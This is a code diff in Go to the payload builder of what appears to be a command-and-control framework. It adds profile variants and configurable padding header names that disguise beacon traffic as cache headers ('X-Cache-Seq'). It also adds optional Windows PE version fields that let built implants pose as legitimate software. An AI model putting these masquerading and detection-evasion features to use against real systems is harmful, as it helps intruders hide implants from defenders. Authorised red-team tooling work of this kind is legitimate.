@@ -107,8 +107,15 @@ type PayloadRequest struct {
 		PipeName    string `json:"pipe_name,omitempty"`    // For SMB payloads
 		SMBProfile  string `json:"smb_profile,omitempty"`  // SMB profile name for transforms
 		// TCP-specific options
-		TCPPort    string `json:"tcp_port,omitempty"`    // For TCP payloads
-		TCPProfile string `json:"tcp_profile,omitempty"` // TCP profile name for transforms
+		TCPPort        string `json:"tcp_port,omitempty"`        // For TCP payloads
+		TCPProfile     string `json:"tcp_profile,omitempty"`     // TCP profile name for transforms
+		ProfileVariant string `json:"profile_variant,omitempty"` // Named profile variant to use
+		// Optional PE version info (Windows only) — omit for no resource section
+		PEFileDescription string `json:"pe_file_description,omitempty"`
+		PECompanyName     string `json:"pe_company_name,omitempty"`
+		PEProductName     string `json:"pe_product_name,omitempty"`
+		PEFileVersion     string `json:"pe_file_version,omitempty"`
+		PEProductVersion  string `json:"pe_product_version,omitempty"`
 	} `json:"data"`
 }
 
@@ -153,6 +160,12 @@ type buildData struct {
 	tcpPort    string // For TCP payloads
 	tcpProfile string // TCP profile name for transforms
 	tcpXorKey  string // Per-build unique XOR key for TCP transforms
+	// Optional PE version info (Windows only)
+	peFileDescription string
+	peCompanyName     string
+	peProductName     string
+	peFileVersion     string
+	peProductVersion  string
 }
 
 func NewBuilder(manager *listeners.Manager, hubClient *hub.Hub, db *sql.DB, agentClient *agent.Client, agentCfg *config.AgentConfig) (*Builder, error) {
@@ -207,6 +220,19 @@ func (b *Builder) buildPayloadAsync(ctx context.Context, req PayloadRequest, cli
 		listener.Name, listener.Protocol, listener.SMBProfile)
 	b.clientUsername = clientUsername
 	b.listener = listener
+
+	// If a profile variant is specified, override the listener's profile bindings
+	if req.Data.ProfileVariant != "" && b.agentConfig != nil {
+		gp, pp, rp, err := b.agentConfig.ResolveVariant(req.Data.ProfileVariant)
+		if err != nil {
+			return fmt.Errorf("profile variant error: %v", err)
+		}
+		b.listener.GetProfile = gp.Name
+		b.listener.PostProfile = pp.Name
+		b.listener.ServerResponseProfile = rp.Name
+		log.Printf("Using profile variant %q: GET=%s POST=%s Response=%s",
+			req.Data.ProfileVariant, gp.Name, pp.Name, rp.Name)
+	}
 
 	// Log safety checks for audit
 	b.logSafetyChecks(req.Data.SafetyChecks, clientUsername, req.Data.Listener)
@@ -1028,6 +1054,11 @@ func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (
 		tcpPort:        tcpPort,             // TCP port for TCP payloads
 		tcpProfile:     req.Data.TCPProfile, // TCP profile for transforms
 		tcpXorKey:      tcpXorKey,           // Per-build unique XOR key for TCP transforms
+		peFileDescription: req.Data.PEFileDescription,
+		peCompanyName:     req.Data.PECompanyName,
+		peProductName:     req.Data.PEProductName,
+		peFileVersion:     req.Data.PEFileVersion,
+		peProductVersion:  req.Data.PEProductVersion,
 	}
 
 	// Fall back to listener's SMB profile if not specified in the request
@@ -1325,6 +1356,20 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *Payloa
 		}
 	}
 
+	// Extract padding header names from profiles (defaults if unset)
+	padPreHeader := "X-Cache-Seq"
+	padAppHeader := "X-Cache-Idx"
+	if b.listener.PostProfile != "" && b.agentConfig != nil {
+		if pp := b.agentConfig.GetPostProfile(b.listener.PostProfile); pp != nil {
+			if pp.PadPreHeader != "" {
+				padPreHeader = pp.PadPreHeader
+			}
+			if pp.PadAppHeader != "" {
+				padAppHeader = pp.PadAppHeader
+			}
+		}
+	}
+
 	// Generate random JSON field names for this build
 	jsonFields, err := GenerateJSONFieldNames()
 	if err != nil {
@@ -1388,8 +1433,8 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *Payloa
 		// HTTP header name strings (pre-connection, must be XOR encrypted)
 		"HTTP_HEADER_USER_AGENT":   "User-Agent",
 		"HTTP_HEADER_CONTENT_TYPE": "Content-Type",
-		"HTTP_HEADER_PAD_PRE":      "X-Pad-Pre",
-		"HTTP_HEADER_PAD_APP":      "X-Pad-App",
+		"HTTP_HEADER_PAD_PRE":      padPreHeader,
+		"HTTP_HEADER_PAD_APP":      padAppHeader,
 		"HTTP_META_ID":             "id",
 		"HTTP_META_ENCRYPTION":     "encryption",
 		"HTTP_ENC_RSA_AES":         "rsa+aes",
@@ -1420,6 +1465,21 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *Payloa
 		fmt.Sprintf("MALLEABLE_REKEY_DATA_FIELD=%s", rekeyDataField),
 		fmt.Sprintf("MALLEABLE_REKEY_ID_FIELD=%s", rekeyIDField),
 		fmt.Sprintf("PAYLOAD_TYPE=%s", data.payloadType),
+	}
+
+	// Pass PE version info to builder if operator specified any fields (Windows only)
+	if data.peFileDescription != "" {
+		envVars = append(envVars, fmt.Sprintf("PE_FILE_DESCRIPTION=%s", data.peFileDescription))
+	}
+	if data.peCompanyName != "" {
+		envVars = append(envVars, fmt.Sprintf("PE_COMPANY_NAME=%s", data.peCompanyName))
+	}
+	if data.peProductName != "" {
+		envVars = append(envVars, fmt.Sprintf("PE_PRODUCT_NAME=%s", data.peProductName))
+	}
+	if data.peFileVersion != "" {
+		envVars = append(envVars, fmt.Sprintf("PE_FILE_VERSION=%s", data.peFileVersion))
+		envVars = append(envVars, fmt.Sprintf("PE_PRODUCT_VERSION=%s", data.peProductVersion))
 	}
 
 	// Load unified link malleable config for payload injection (shared between SMB and TCP)
